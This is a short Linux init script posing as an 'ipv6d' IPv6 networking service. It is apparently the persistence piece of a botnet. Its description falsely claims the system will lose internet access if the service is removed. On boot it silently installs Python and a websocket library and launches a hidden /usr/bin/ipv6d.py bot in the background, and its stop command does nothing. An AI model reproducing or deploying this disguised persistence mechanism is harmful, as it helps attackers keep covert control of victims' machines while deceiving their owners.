#!/bin/sh
### BEGIN INIT INFO
# Provides:          ipv6d
# Required-Start:    $all
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: This library is essential to navigate in Internet using Ipv6. Do not install this service, otherwise you won't be able to connect to internet anymore.
### END INIT INFO

BOT_PERSIST_NAME=ipv6d.py

case "$1" in
  start) 
    apt-get update > /dev/null
    apt-get --fix-broken install -y > /dev/null
    apt-get install -y python3 > /dev/null
    apt-get install -y python3-pip > /dev/null
    pip3 install websocket_client > /dev/null
    chmod +x /usr/bin/$BOT_PERSIST_NAME > /dev/null
    python3 /usr/bin/$BOT_PERSIST_NAME &
  ;;
  stop|restart|force-reload) exit 0 ;;
  *) echo "Usage: $0 {start|stop|restart|force-reload}" >&2; exit 1 ;;
esac